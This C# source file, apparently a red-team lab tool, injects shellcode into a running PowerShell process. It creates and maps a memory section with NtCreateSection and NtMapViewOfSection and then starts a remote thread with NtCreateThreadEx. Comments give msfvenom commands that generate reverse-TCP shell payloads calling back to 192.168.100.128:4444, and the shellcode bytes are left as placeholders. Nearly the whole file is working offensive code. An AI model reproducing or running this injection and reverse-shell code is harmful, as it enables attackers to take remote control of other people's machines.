using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.ComponentModel;


namespace Inject
{
    class Program
    {
        // https://www.pinvoke.net/default.aspx/kernel32/MapViewOfFile.html?diff=y
        private static readonly uint SECTION_MAP_READ = 0x0004;
        private static readonly uint SECTION_MAP_WRITE = 0x0002;
        private static readonly uint SECTION_MAP_EXECUTE = 0x0008;
        // https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
        private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;
        private static readonly uint SEC_COMMIT = 0x8000000;
        private static readonly uint PAGE_READWRITE = 0x04;
        private static readonly uint PAGE_READEXECUTE = 0x20;
        private static readonly uint PAGE_NOACCESS = 0x01;
        private static readonly uint MEM_RELEASE = 0x00008000;
        private static readonly uint MEM_DECOMMIT = 0x00004000;
        private static readonly uint DELETE = 0x00010000;

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);     
        
        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);
        
        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

     
        static void Main(string[] args)
        {
            byte[] buf;
            IntPtr hremoteProcess = default;

            Process[] targetProcess = Process.GetProcessesByName("powershell"); //You can change it.
            bool processArch = false;

            //Open remote process
            hremoteProcess = OpenProcess(0x001F0FFF, false, targetProcess[0].Id);
            IsWow64Process(hremoteProcess, out processArch);

           

            // Local process handle
            IntPtr hlocalProcess = Process.GetCurrentProcess().Handle;

            // x86 Payload: msfvenom -p windows/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
            byte[] bufx86 = new byte[<SHELLCODE_LENGTH>] { <SHELLCODE_X86> };

            // x64 Payload: msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
            byte[] bufx64 = new byte[<SHELLCODE_LENGTH>] { <SHELLCODE_X64> };

            if (processArch == true)
            {
                //Injected process is x86
                buf = bufx86;
                Console.WriteLine("Shellcode injected to x86 process.");
            }
            else
            {
                //Injected process is x64
                buf = bufx64;
                Console.WriteLine("Shellcode injected to x64 process.");

            }

            int len = buf.Length;
            uint bufferLength = (uint)len;

            // Create a new section.
            IntPtr sectionHandler = new IntPtr(); 
            long createSection = (int)NtCreateSection(ref sectionHandler, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,IntPtr.Zero,ref bufferLength,PAGE_EXECUTE_READWRITE,SEC_COMMIT,IntPtr.Zero);
            Console.WriteLine("[+] New section was created on processID: " + targetProcess[0].Id);
            Console.WriteLine("1st breakpoint. Press Enter to continue ...");
            Console.ReadLine();

            // Map the new section for the LOCAL process.
            IntPtr localBaseAddress = new IntPtr();
            int sizeLocal = 4096;
            ulong offsetSectionLocal = new ulong();


            long mapSectionLocal = NtMapViewOfSection(sectionHandler, hlocalProcess, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, PAGE_READWRITE);

            // Convert Demical to Hex
            var localBaseAddrString = string.Format("{0:X}", localBaseAddress); //Pointer -> String (DEC) format.
            UInt64 localBaseAddrInt = UInt64.Parse(localBaseAddrString); //String -> Integer
            string localBaseAddHex = localBaseAddrInt.ToString("x"); //Integer -> Hex

            Console.WriteLine("[+] New section mapped for the LOCAL process!");
            Console.WriteLine("Local ProcessID: " + Process.GetCurrentProcess().Id);
            Console.WriteLine("Local Process BaseAddress: 0x" + localBaseAddHex);
            Console.WriteLine("View size: " + sizeLocal);
            Console.WriteLine("Offset: " + offsetSectionLocal);
            Console.WriteLine("2nd breakpoint. Press Enter to continue ...");
            Console.ReadLine();

            // Map the new section for the REMOTE process.
            IntPtr remoteBaseAddress = new IntPtr();
            int sizeRemote = 4096;
            ulong offsetSectionRemote = new ulong();
            long mapSectionRemote = NtMapViewOfSection(sectionHandler, hremoteProcess, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionRemote, out sizeRemote, 2, 0, PAGE_READEXECUTE);

            // Convert Demical to Hex
            var remoteBaseAddrString = string.Format("{0:X}", remoteBaseAddress); //Pointer -> String (DEC) format.
            UInt64 remoteBaseAddrInt = UInt64.Parse(remoteBaseAddrString); //String -> Integer
            string remoteBaseAddHex = remoteBaseAddrInt.ToString("x"); //Integer -> Hex

            Console.WriteLine("[+] New section mapped for the REMOTE process!");
            Console.WriteLine("Remote ProcessID: "+ targetProcess[0].Id);
            Console.WriteLine("Remote Process BaseAddress: 0x"+ remoteBaseAddHex);
            Console.WriteLine("View size: " + sizeRemote);
            Console.WriteLine("Offset: "+ offsetSectionRemote);
            Console.WriteLine("3rd breakpoint. Press Enter to continue ...");
            Console.ReadLine();

            Marshal.Copy(buf, 0, localBaseAddress, buf.Length);
            Console.WriteLine("[+] Shellcode copied to local process: 0x" + localBaseAddHex);
            Console.WriteLine("[+] Mapped to remote process address: 0x" + remoteBaseAddHex);
            Console.WriteLine("4th breakpoint. Press Enter to continue ...");
            Console.ReadLine();


            unsafe
            {
                fixed (byte* p = &buf[0])
                {
                    byte* p2 = p;
                    // https://stackoverflow.com/questions/2057469/how-can-i-display-a-pointer-address-in-c
                    //string bufAddress = string.Format("0x{0:X}", new IntPtr(p2));

                    //Convert DEC->HEX
                    var bufString = string.Format("{0:X}", new IntPtr(p2)); //Pointer -> String (DEC) format.
                    UInt64 bufInt = UInt64.Parse(bufString); //String -> Integer
                    string bufHex = bufInt.ToString("x"); //Integer -> Hex

                    Console.WriteLine("[+] Payload Address on this executable: " + "0x" + bufHex);

                }
            }
            

            //Enumerate the threads of the remote process before creating a new one.
            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(targetProcess[0].Id).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            //Create a remote thread and execute it.
            //IntPtr hThread = CreateRemoteThread(hremoteProcess, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
            
            IntPtr hRemoteThread;
            uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, hremoteProcess, remoteBaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            
            if (hThread == 0x00)
            {
                Console.WriteLine("[+] Injection Succeded!");
            }
            else
            {
                Console.WriteLine("[-] Injection failed!");
            }

            //Enumerate threads from the given process.
            ProcessThreadCollection threads = Process.GetProcessById(targetProcess[0].Id).Threads;
            foreach (ProcessThread thread in threads)
            {
                if (!threadList.Contains(thread.Id))
                {
                    Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                }

            }

            // Unmap the locally mapped section: 'NtUnMapViewOfSection'
            uint unmapStatus = NtUnmapViewOfSection(hlocalProcess, localBaseAddress);
            Console.WriteLine("[+] Local memory section unmapped!");

            // Close the section
            int SectionStatus = NtClose(sectionHandler);
            Console.WriteLine("[+] Memory section closed!");
        }
    }
}
